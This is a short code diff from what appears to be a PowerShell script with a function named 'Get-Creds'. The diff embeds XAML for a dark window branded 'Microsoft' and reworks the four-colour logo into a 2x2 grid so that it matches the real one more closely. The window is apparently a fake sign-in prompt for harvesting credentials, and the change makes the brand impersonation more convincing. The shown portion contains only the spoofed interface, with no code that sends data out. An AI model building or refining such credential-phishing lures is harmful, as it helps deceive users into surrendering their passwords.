@@ -19,11 +19,22 @@ function Get-Creds {
     <Grid Background="#1F1F1F">
         <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="500">
             <!-- Logo Microsoft -->
-            <StackPanel Orientation="Horizontal" Height="50" Margin="0,0,0,40" VerticalAlignment="Center">
-                <Rectangle Width="15" Height="15" Fill="#F25022" Margin="0,0,5,0"/>
-                <Rectangle Width="15" Height="15" Fill="#7FBA00" Margin="0,0,5,0"/>
-                <Rectangle Width="15" Height="15" Fill="#00A4EF" Margin="0,0,5,0"/>
-                <Rectangle Width="15" Height="15" Fill="#FFB900" Margin="0,0,20,0"/>
+                        <!-- Logo Microsoft -->
+            <StackPanel Orientation="Horizontal" Margin="0,0,0,40" VerticalAlignment="Top">
+                <Grid Width="40" Height="40" Margin="0,0,15,0">
+                    <Grid.RowDefinitions>
+                        <RowDefinition Height="*"/>
+                        <RowDefinition Height="*"/>
+                    </Grid.RowDefinitions>
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="*"/>
+                        <ColumnDefinition Width="*"/>
+                    </Grid.ColumnDefinitions>
+                    <Rectangle Grid.Row="0" Grid.Column="0" Fill="#F25022" Margin="0,0,2,2"/>
+                    <Rectangle Grid.Row="0" Grid.Column="1" Fill="#7FBA00" Margin="2,0,0,2"/>
+                    <Rectangle Grid.Row="1" Grid.Column="0" Fill="#00A4EF" Margin="0,2,2,0"/>
+                    <Rectangle Grid.Row="1" Grid.Column="1" Fill="#FFB900" Margin="2,2,0,0"/>
+                </Grid>
                 <TextBlock Text="Microsoft" FontSize="24" FontWeight="Bold" Foreground="White" VerticalAlignment="Center"/>
             </StackPanel>
             
